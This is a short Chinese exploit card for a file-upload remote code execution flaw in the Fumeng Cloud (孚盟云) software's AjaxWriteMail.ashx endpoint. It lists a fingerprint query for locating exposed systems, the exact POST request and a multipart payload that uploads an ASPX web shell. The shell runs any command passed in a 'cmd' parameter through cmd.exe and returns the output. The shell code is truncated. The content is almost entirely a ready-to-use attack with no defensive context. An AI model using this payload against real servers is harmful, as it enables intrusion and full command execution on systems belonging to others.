# 孚盟云AjaxWriteMail.ashx存在文件上传致RCE漏洞

- **系统**：孚盟云　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/AjaxWriteMail.ashx?method=UpLoadAttachment HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vB…`

**请求体 / payload**
```
------WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Disposition: form-data; name="file"; filename="test.aspx"
Content-Type: text/plain
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
Sy…（脚本共 703 字，完整版见原文）
```
- **预期**：200　|　—